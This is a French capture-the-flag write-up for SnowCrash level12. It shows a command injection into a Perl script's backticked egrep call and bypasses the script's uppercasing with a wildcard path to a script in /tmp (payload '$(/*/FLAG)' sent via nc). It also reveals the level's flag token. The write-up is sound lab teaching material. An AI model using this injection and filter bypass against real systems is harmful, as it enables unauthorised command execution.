# Level12 - Injection de commande
Pour résoudre le level12, on a un fichier `level12.pl`. level12 est un script perl qui va écouter sur le port 4646 et prends deux arguments en paramètres: `x` et `y`.
Le programme va ensuite exécuter une série de regexp, qui vont notamment uppercase l'argument `x` et supprimer le reste de la string après un espace.

Le programme exécute ensuite une commande shell, un `egrep` dans lequel une injection de commande est possible par l'utilisateur.

```
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

Le soucis que l'on va rencontrer est que l'on ne peut pas exécuter de commandes étant donné que l'entièreté de l'argument sera transformé en uppercase. On ne peut pas non plus utiliser d'aliases car le programme est exécuté sur l'utilisateur `flag12` auquel nous n'avons pas accès.

La solution serait de faire exécuter un fichier étant donné que l'on peut mettre son nom en majuscules sans soucis, mais on se heurte au problème de son path qui sera lui aussi mis en uppercase. 

La solution est d'utiliser une wildcard dans le path de notre fichier.

```
level12@SnowCrash:~$ cat /tmp/TEST
#!/bin/bash
echo toto

level12@SnowCrash:~$ chmod 777 /tmp/TEST

level12@SnowCrash:~$ /*/TEST
toto
```

On peut voir que le fichier TEST dans /tmp a bien été exécuté alors que nous n'avons pas spécifié son path. On peut donc utiliser cette technique et injecter une exécution de fichier dans l'argument passé à `egrep`.

```
level12@SnowCrash:~$ cat /tmp/FLAG
#!/bin/bash
getflag > /tmp/flag

level12@SnowCrash:~$ chmod 777 /tmp/FLAG
level12@SnowCrash:~$ nc localhost 4646
GET ?x=$(/*/FLAG)
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

On a notre token: `g1qKMiRpXf53AWhDaU7FEkczr`

